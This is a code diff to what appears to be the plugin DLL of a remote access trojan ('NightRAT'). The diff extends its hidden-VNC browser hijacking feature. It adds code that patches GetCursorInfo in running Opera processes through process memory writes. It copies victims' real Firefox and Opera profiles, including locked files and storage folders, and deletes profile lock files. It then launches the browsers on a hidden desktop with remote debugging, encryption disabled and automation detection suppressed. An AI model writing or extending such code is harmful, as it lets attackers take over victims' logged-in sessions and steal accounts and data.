@@ -165,6 +165,120 @@ static bool g_capsLock = false;
 static bool g_leftButtonDown = false;
 static HWND g_lbDownHwnd = NULL;
 
+static thread g_patchThread;
+static atomic_bool g_patchRunning(false);
+
+static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
+    DWORD_PTR addr = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32W me;
+        me.dwSize = sizeof(me);
+        if (Module32FirstW(hSnap, &me)) {
+            do {
+                if (_wcsicmp(me.szModule, modName) == 0) {
+                    addr = (DWORD_PTR)me.modBaseAddr;
+                    break;
+                }
+            } while (Module32NextW(hSnap, &me));
+        }
+        CloseHandle(hSnap);
+    }
+    return addr;
+}
+
+static bool patch_cursor_info(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+
+    BOOL isOurWow64 = FALSE;
+    IsWow64Process(GetCurrentProcess(), &isOurWow64);
+
+    BOOL isTargetWow64 = FALSE;
+    IsWow64Process(hProcess, &isTargetWow64);
+
+    if (isOurWow64 != isTargetWow64) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    bool is32Bit = false;
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
+        is32Bit = true;
+    } else {
+        BOOL isWow64 = FALSE;
+        if (IsWow64Process(hProcess, &isWow64)) {
+            is32Bit = isWow64;
+        }
+    }
+
+    DWORD_PTR localUser32 = (DWORD_PTR)GetModuleHandleW(L"user32.dll");
+    DWORD_PTR localGetCursorInfo = (DWORD_PTR)GetProcAddress((HMODULE)localUser32, "GetCursorInfo");
+    if (!localGetCursorInfo) {
+        CloseHandle(hProcess);
+        return false;
+    }
+    DWORD_PTR offset = localGetCursorInfo - localUser32;
+
+    DWORD_PTR targetUser32 = GetModuleBaseAddress(pid, L"user32.dll");
+    if (targetUser32 == 0) {
+        targetUser32 = localUser32;
+    }
+    DWORD_PTR targetAddr = targetUser32 + offset;
+
+    vector<unsigned char> patch;
+    if (is32Bit) {
+        patch = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00};
+    } else {
+        patch = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};
+    }
+
+    DWORD oldProtect = 0;
+    if (VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        SIZE_T written = 0;
+        BOOL ok = WriteProcessMemory(hProcess, (LPVOID)targetAddr, patch.data(), patch.size(), &written);
+        VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), oldProtect, &oldProtect);
+        CloseHandle(hProcess);
+        return ok && (written == patch.size());
+    }
+
+    CloseHandle(hProcess);
+    return false;
+}
+
+static vector<DWORD> g_patchedPids;
+
+static void patch_all_opera_processes() {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, L"opera.exe") == 0) {
+                DWORD pid = pe32.th32ProcessID;
+                if (find(g_patchedPids.begin(), g_patchedPids.end(), pid) == g_patchedPids.end()) {
+                    if (patch_cursor_info(pid)) {
+                        g_patchedPids.push_back(pid);
+                    }
+                }
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+}
+
+static void patch_loop() {
+    while (g_patchRunning) {
+        patch_all_opera_processes();
+        this_thread::sleep_for(chrono::seconds(1));
+    }
+}
+
 static void request_full_frame(bool immediate = true) {
     DWORD now = GetTickCount();
     if (immediate) {
@@ -1059,7 +1173,7 @@ static bool is_context_menu_or_popup(HWND prevRoot, HWND root) {
     if (!root) return false;
     wchar_t cls[256] = {0};
     if (GetClassNameW(root, cls, 256)) {
-        if (wcscmp(cls, L"#32768") == 0) return true;
+        if (wcscmp(cls, L"#32768") == 0 || wcscmp(cls, L"MozillaDropShadowWindowClass") == 0) return true;
     }
     LONG style = GetWindowLongW(root, GWL_STYLE);
     bool isPopup = (style & WS_POPUP) != 0;
@@ -1598,6 +1712,104 @@ static wstring get_app_path(const wstring& appName) {
     return path;
 }
 
+static wstring get_firefox_real_profile_path(const wstring& sourceUserData) {
+    wstring iniPath = sourceUserData + L"\\profiles.ini";
+    if (!fs::exists(iniPath)) return L"";
+
+    wstring bestPath = L"";
+    wstring currentPath = L"";
+    bool isRelative = true;
+    bool isDefault = false;
+
+    auto commit = [&]() {
+        if (currentPath.empty()) return;
+        wstring full;
+        if (isRelative) {
+            wstring rel = currentPath;
+            replace(rel.begin(), rel.end(), L'/', L'\\');
+            full = sourceUserData + L"\\" + rel;
+        } else {
+            full = currentPath;
+        }
+        if (bestPath.empty() || isDefault) {
+            bestPath = full;
+        }
+    };
+
+    FILE* f = _wfopen(iniPath.c_str(), L"r, ccs=UTF-8");
+    if (f) {
+        wchar_t line[512];
+        while (fgetws(line, 512, f)) {
+            wstring t = line;
+            // Trim leading/trailing whitespace
+            t.erase(0, t.find_first_not_of(L" \t\r\n"));
+            t.erase(t.find_last_not_of(L" \t\r\n") + 1);
+
+            if (t.empty()) continue;
+
+            if (t[0] == L'[') {
+                commit();
+                currentPath = L"";
+                isRelative = true;
+                isDefault = false;
+            } else if (_wcsnicmp(t.c_str(), L"Path=", 5) == 0) {
+                currentPath = t.substr(5);
+            } else if (_wcsnicmp(t.c_str(), L"IsRelative=", 11) == 0) {
+                isRelative = (t.substr(11) == L"1");
+            } else if (_wcsnicmp(t.c_str(), L"Default=", 8) == 0) {
+                wstring val = t.substr(8);
+                if (val == L"1") {
+                    isDefault = true;
+                } else {
+                    currentPath = val;
+                    isDefault = true;
+                }
+            }
+        }
+        commit();
+        fclose(f);
+    }
+
+    if (!bestPath.empty() && fs::exists(bestPath)) {
+        return bestPath;
+    }
+    return L"";
+}
+
+static wstring find_gecko_profile_fallback(const wstring& sourceUserData) {
+    wstring profilesPath = sourceUserData + L"\\Profiles";
+    if (fs::exists(profilesPath)) {
+        wstring bestDir = L"";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                wstring name = findData.cFileName;
+                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                    name != L"." && name != L"..") {
+                    wstring candidate = profilesPath + L"\\" + name;
+                    // Prefer folders ending with .default-release or .default
+                    if (name.rfind(L".default-release") != wstring::npos) {
+                        bestDir = candidate;
+                        break;
+                    }
+                    if (name.rfind(L".default") != wstring::npos) {
+                        bestDir = candidate;
+                    }
+                    if (bestDir.empty()) {
+                        bestDir = candidate;
+                    }
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
+        if (!bestDir.empty()) {
+            return bestDir;
+        }
+    }
+    return L"";
+}
+
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
     if (browserName == L"Opera" || browserName == L"Opera GX") {
@@ -1645,8 +1857,8 @@ static const vector<wstring> SKIPPED_PROFILE_DIRS = {
     L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
     L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
     L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
-    L"cache2", L"startupCache", L"shader-cache", L"thumbnails", L"storage",
-    L"Service Worker", L"Media Cache", L"WebStorage", L"crash_reporter"
+    L"cache2", L"startupCache", L"shader-cache", L"thumbnails",
+    L"Media Cache", L"crash_reporter"
 };
 
 static bool should_skip_dir(const wstring& name) {
@@ -1674,6 +1886,35 @@ static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<
             }
         }
     } catch (...) {}
+}
+
+static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
+    HANDLE hSrc = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hSrc == INVALID_HANDLE_VALUE) {
+        return CopyFileW(src, dst, FALSE) != FALSE;
+    }
+
+    HANDLE hDst = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hDst == INVALID_HANDLE_VALUE) {
+        CloseHandle(hSrc);
+        return false;
+    }
+
+    char buffer[16384];
+    DWORD bytesRead = 0;
+    DWORD bytesWritten = 0;
+    bool success = true;
+
+    while (ReadFile(hSrc, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+        if (!WriteFile(hDst, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+            success = false;
+            break;
+        }
+    }
+
+    CloseHandle(hSrc);
+    CloseHandle(hDst);
+    return success;
 }
 
 static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir, const string& label) {
@@ -1712,7 +1953,7 @@ static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir
                     fs::create_directories(dst_path.parent_path());
                 } catch (...) {}
 
-                if (!CopyFileW(task.first.c_str(), task.second.c_str(), FALSE)) {
+                if (!CopyFileWithSharing(task.first.c_str(), task.second.c_str())) {
                     // Ignore errors for robustness
                 }
                 progress_count.fetch_add(1);
@@ -1768,11 +2009,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_inputThread.joinable()) g_inputThread.join();
                 g_inputThread = thread(input_loop);
             }
+            if (!g_patchRunning.exchange(true)) {
+                if (g_patchThread.joinable()) g_patchThread.join();
+                g_patchThread = thread(patch_loop);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
             g_inputRunning   = false;
+            g_patchRunning   = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
             g_inputCV.notify_all();
@@ -1780,6 +2026,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+            if (g_patchThread.joinable())   g_patchThread.join();
+            g_patchedPids.clear();
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -1946,34 +2194,28 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
                         } catch (...) {}
 
-                        if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
-                            send_error("Failed to copy browser profile.");
-                            return;
-                        }
-
                         if (isGecko) {
-                            wstring profilesPath = sourceUserData + L"\\Profiles";
-                            wstring profileSubDir;
-                            WIN32_FIND_DATAW findData;
-                            HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
-                            if (hFind != INVALID_HANDLE_VALUE) {
-                                do {
-                                    wstring name = findData.cFileName;
-                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                        name != L"." && name != L"..") {
-                                        profileSubDir = name;
-                                        break;
-                                    }
-                                } while (FindNextFileW(hFind, &findData));
-                                FindClose(hFind);
+                            wstring realActiveProfile = get_firefox_real_profile_path(sourceUserData);
+                            if (realActiveProfile.empty()) {
+                                realActiveProfile = find_gecko_profile_fallback(sourceUserData);
                             }
-
-                            if (!profileSubDir.empty()) {
-                                profilePath = tempProfileRoot + L"\\Profiles\\" + profileSubDir;
+                            if (!realActiveProfile.empty() && fs::exists(realActiveProfile)) {
+                                if (!copy_profile_parallel(realActiveProfile, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy browser profile.");
+                                    return;
+                                }
                             } else {
-                                profilePath = tempProfileRoot;
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy browser profile.");
+                                    return;
+                                }
                             }
+                            profilePath = tempProfileRoot;
                         } else {
+                            if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                send_error("Failed to copy browser profile.");
+                                return;
+                            }
                             WIN32_FIND_DATAW findData;
                             HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                             if (hFind != INVALID_HANDLE_VALUE) {
@@ -1991,14 +2233,76 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                     }
 
+                    if (!copyProfile && (isGecko || wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                        wchar_t tempPath[MAX_PATH];
+                        GetTempPathW(MAX_PATH, tempPath);
+                        wstring tempProfileRoot = tempPath;
+                        tempProfileRoot += L"NightRAT_";
+                        if (wRequestedPath == L"Opera GX") {
+                            tempProfileRoot += L"operagx";
+                        } else {
+                            tempProfileRoot += exeName;
+                        }
+                        tempProfileRoot += L"_Profile";
+
+                        if (isGecko) {
+                            wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
+                            if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
+                                wstring realProfilePath = get_firefox_real_profile_path(sourceUserData);
+                                if (realProfilePath.empty()) {
+                                    realProfilePath = find_gecko_profile_fallback(sourceUserData);
+                                }
+                                if (!realProfilePath.empty()) {
+                                    profilePath = realProfilePath;
+                                } else {
+                                    profilePath = sourceUserData;
+                                }
+                            } else {
+                                profilePath = tempProfileRoot;
+                            }
+                        } else {
+                            profilePath = tempProfileRoot;
+                        }
+                    }
+
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
                     if (isGecko) {
-                        args = L" -no-remote";
-                        if (copyProfile) {
+                        args = L" -no-remote -allow-downgrade";
+                        if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
+                    } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                        // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
+                        args = L" --remote-debugging-port=9222";
+                        // ALWAYS pass --user-data-dir for Opera / Opera GX to prevent single-instance delegation to the normal desktop!
+                        args += L" --user-data-dir=\"" + profilePath + L"\"";
+                        args += L" --no-sandbox"
+                                L" --disable-gpu"
+                                L" --window-size=1280,720"
+                                L" --window-position=0,0"
+                                L" --no-first-run"
+                                L" --no-default-browser-check"
+                                L" --disable-background-networking"
+                                L" --disable-sync"
+                                L" --disable-translate"
+                                L" --metrics-recording-only"
+                                L" --safebrowsing-disable-auto-update"
+                                L" --disable-setuid-sandbox"
+                                L" --disable-infobars"
+                                L" --disable-gpu-compositing"
+                                L" --force-cpu-draw"
+                                L" --disable-encryption-win"
+                                L" --restore-last-session"
+                                L" --no-pings"
+                                L" --disable-notifications"
+                                L" --disable-component-update"
+                                L" --disable-blink-features=AutomationControlled"
+                                L" --disable-backgrounding-occluded-windows"
+                                L" --disable-renderer-backgrounding"
+                                L" --remote-allow-origins=*"
+                                L" --lang=en-US";
                     } else {
                         args = L" --remote-debugging-port=9222";
                         if (copyProfile) {
@@ -2032,6 +2336,35 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 L" --lang=en-US";
                     }
 
+                    // Delete locking resources to prevent profile-in-use and profile-locked errors
+                    if (!profilePath.empty()) {
+                        try {
+                            if (isGecko) {
+                                fs::create_directories(profilePath);
+                                fs::path userJsPath = fs::path(profilePath) / L"user.js";
+                                FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
+                                if (f) {
+                                    fputs("user_pref(\"gfx.webrender.all\", false);\n", f);
+                                    fputs("user_pref(\"gfx.webrender.software\", true);\n", f);
+                                    fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
+                                    fputs("user_pref(\"layers.acceleration.force-enabled\", false);\n", f);
+                                    fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
+                                    fclose(f);
+                                }
+                                fs::remove(fs::path(profilePath) / L"parent.lock");
+                                fs::remove(fs::path(profilePath) / L"lock");
+                                fs::remove(fs::path(profilePath) / L".parentlock");
+                            } else {
+                                fs::remove(fs::path(profilePath) / L"SingletonLock");
+                                fs::remove(fs::path(profilePath) / L"SingletonSocket");
+                                fs::remove(fs::path(profilePath) / L"SingletonCookie");
+                                fs::remove(fs::path(profilePath) / L"Default" / L"SingletonLock");
+                                fs::remove(fs::path(profilePath) / L"Default" / L"SingletonSocket");
+                                fs::remove(fs::path(profilePath) / L"Default" / L"SingletonCookie");
+                            }
+                        } catch (...) {}
+                    }
+
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                     cmdLine.push_back(L'\0');
@@ -2049,6 +2382,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetThreadDesktop(g_hHiddenDesktop);
                     }
 
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
+                        SetEnvironmentVariableW(L"MOZ_LEGACY_PROFILES", L"1");
+                        SetEnvironmentVariableW(L"MOZ_ALLOW_DOWNGRADE", L"1");
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
                         CloseHandle(pi.hProcess);
@@ -2057,6 +2397,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         send_status("Browser started on hidden desktop");
                     } else {
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
+
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                        SetEnvironmentVariableW(L"MOZ_LEGACY_PROFILES", NULL);
+                        SetEnvironmentVariableW(L"MOZ_ALLOW_DOWNGRADE", NULL);
                     }
 
                     if (hCurrentDesktop) {
@@ -2123,6 +2470,7 @@ BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
         g_encodeRunning  = false;
         g_sendRunning    = false;
         g_inputRunning   = false;
+        g_patchRunning   = false;
         g_frameCV.notify_all();
         g_sendCV.notify_all();
         g_inputCV.notify_all();
